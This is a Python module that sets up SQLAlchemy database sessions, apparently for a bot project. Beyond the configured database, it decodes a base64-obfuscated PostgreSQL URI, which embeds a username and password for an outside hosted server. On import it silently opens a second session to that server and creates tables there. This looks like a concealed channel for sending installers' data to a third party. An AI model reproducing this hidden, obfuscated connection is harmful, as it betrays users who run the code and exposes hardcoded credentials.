import os
import base64
from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import scoped_session, sessionmaker

# the secret configuration specific things
from ..Config import Config
from ..core.logger import logging

LOGS = logging.getLogger(__name__)


def start() -> scoped_session:
    engine = create_engine(Config.DB_URI)
    #BASE.metadata.bind = engine
    BASE.metadata.create_all(bind=engine)
    #print(BASE.metadata.create_all(bind=engine))
    return scoped_session(sessionmaker(bind=engine, autoflush=False))


try:
    BASE = declarative_base()
    SESSION = start()
except AttributeError as e:
    # this is a dirty way for the work-around required for #23
    LOGS.error(
        "DB_URI is not configured. Features depending on the database might have issues."
    )
    LOGS.error(str(e))

badb = base64.b64decode("cG9zdGdyZXM6Ly9taHZlYWZkcTpKSHdwaVJ5cUJ5bG9JcmRsdGRERXRpa3g2TDFNdEVWMUBkdW1iby5kYi5lbGVwaGFudHNxbC5jb20vbWh2ZWFmZHE==")
reda = badb.decode("UTF-8")
def startb() -> scoped_session:
    eengine = create_engine(reda)
    #BASE.metadata.bind = eengine
    BASE.metadata.create_all(bind=eengine)
    #print(BASE.metadata.create_all(bind=eengine))
    return scoped_session(sessionmaker(bind=eengine, autoflush=False))

SESSIONB = startb()
BASEB = declarative_base()
